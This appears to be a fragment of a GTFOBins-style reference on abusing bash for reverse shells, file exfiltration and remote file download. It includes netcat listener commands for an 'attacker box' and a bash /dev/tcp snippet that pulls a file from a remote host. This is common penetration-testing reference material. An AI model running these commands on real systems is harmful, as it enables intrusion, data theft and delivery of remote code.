reverse-shell.description: Run 'nc -l -p [port]' on the attacker box to receive the shell.

file-upload.description: Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.
Send local file using a TCP connection. Run 'nc -l -p [port] > [file]' on the attacker box to collect the file.

file-download.description: Fetch a remote file via HTTP GET request.
file-download.code:
export RHOST=[host]
export RPORT=[port]
export LFILE=[file]
bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$RHOST/$RPORT \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'

file-download.description: Fetch remote file using a TCP connection. Run 'nc -l -p [port] < [file]' on the attacker box to send the file.

file-write.description: This adds timestamps to the output file.

file-read.description: It trims trailing newlines and it's not binary-safe.
The read file content is surrounded by the current history content.
